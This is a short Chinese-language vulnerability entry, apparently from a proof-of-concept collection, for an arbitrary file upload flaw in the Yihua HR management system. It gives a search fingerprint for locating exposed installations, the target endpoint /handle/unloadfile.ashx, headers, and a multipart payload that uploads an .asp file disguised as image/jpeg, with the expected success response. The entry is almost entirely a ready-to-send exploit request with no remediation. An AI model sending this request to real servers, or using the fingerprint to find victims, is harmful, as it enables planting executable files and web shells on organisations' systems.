# 亿华人力资源管理系统unloadfile存在任意文件上传漏洞

- **系统**：亿华人力资源管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="亿华人力资源管理系统"`
- **请求**：`POST /handle/unloadfile.ashx HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: multipart/form-data; boundary=---------------------------219…`

**请求体 / payload**
```
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="file"; filename="stc.asp"
Content-Type: image/jpeg
test
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="action"
unloadfile
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="filepath"
./
-----------------------------21909179191068471382830692394—
```
- **预期**：200　|　—